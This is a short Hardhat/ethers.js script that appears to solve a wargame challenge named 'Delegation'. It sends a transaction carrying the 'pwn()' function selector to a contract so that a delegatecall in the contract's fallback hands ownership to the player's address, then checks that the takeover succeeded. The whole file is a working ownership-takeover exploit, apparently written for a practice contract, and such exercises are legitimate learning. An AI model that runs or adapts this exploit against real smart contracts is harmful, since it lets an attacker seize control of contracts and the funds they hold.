import { ethers } from 'hardhat';

import { Contract, ContractFactory } from 'ethers';

const CONTRACT_ADDRESS = '0xF380bC8b4e595dECa3A55A4C98A6C4fA1c96f537';
const PLAYER_ADDRESS = '0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199';

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);

  const data = ethers.utils.hexDataSlice(
    ethers.utils.keccak256(ethers.utils.toUtf8Bytes('pwn()')),
    0,
    4,
  );
  //invoke a public function by sending data in a transaction.
  const tx = await signer.sendTransaction({
    to: CONTRACT_ADDRESS,
    data: data,
    gasLimit: 50000,
    gasPrice: ethers.utils.parseUnits('50', 'gwei'),
  });

  const delegation = await ethers.getContractAt(
    'Delegation',
    CONTRACT_ADDRESS,
    signer,
  );

  console.log((await delegation.owner()) === PLAYER_ADDRESS);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
